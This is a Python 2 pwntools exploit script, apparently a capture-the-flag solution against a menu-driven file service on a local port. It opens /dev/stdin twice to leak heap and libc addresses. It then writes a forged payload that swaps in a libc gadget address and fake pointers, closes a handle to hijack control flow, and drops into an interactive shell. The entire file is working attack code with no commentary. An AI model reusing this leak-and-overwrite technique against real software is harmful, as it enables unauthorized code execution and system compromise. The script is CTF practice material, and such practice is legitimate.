#!/usr/bin/env python2

import tty

from pwn import *


def escape(s):
    return ''.join('\x16' + x for x in s)


class io_funcs(object):
    def __init__(self, io):
        self._io = io
    
    def interactive(self):
        self._io.interactive()

    def open(self, idx, name):
        self._io.sendlineafter('Exit\r\n', '1')
        self._io.sendlineafter('index:\r\n', str(idx))
        self._io.sendafter('filename:\r\n', name)

    def readwrite(self, idx, size, data):
        self._io.sendlineafter('Exit\r\n', '2')
        self._io.sendlineafter('index:\r\n', str(idx))
        self._io.sendlineafter('size:\r\n', str(size))
        self._io.send(escape(data) + chr(tty.CEOF))
        return self._io.recvn(size)

    def close(self, idx):
        self._io.sendlineafter('Exit\r\n', '3')
        self._io.sendlineafter('index:\r\n', str(idx))

    def exit(self):
        self._io.sendlineafter('Exit\r\n', '4')


def main(iof):
    leak_size = 2048
    
    iof.open(0, '/dev/stdin\n')
    iof.open(1, '/dev/stdin\n')
    
    leak = iof.readwrite(0, leak_size, '')

    heap_base = u64(leak[120:120+8]) - 0x940
    log.info('heap_base @ 0x%x' % heap_base)
    
    libc_base = u64(leak[328:328+8]) - 0x3c36e0
    log.info('libc_base @ 0x%x' % libc_base)
    
    payload = p64(libc_base + 0x4526a) + \
              leak[8:] \
                .replace(p64(libc_base + 0x3c36e0), p64(heap_base + 0x6A0)) \
                .replace(p64(heap_base + 0x940), p64(libc_base + 0x1880a3))

    iof.readwrite(0, leak_size, payload)
    
    iof.close(1)
    iof.interactive()


if __name__ == '__main__':
    io = remote('0.0.0.0', 41737)
    iof = io_funcs(io)
    main(iof)
    io.close()
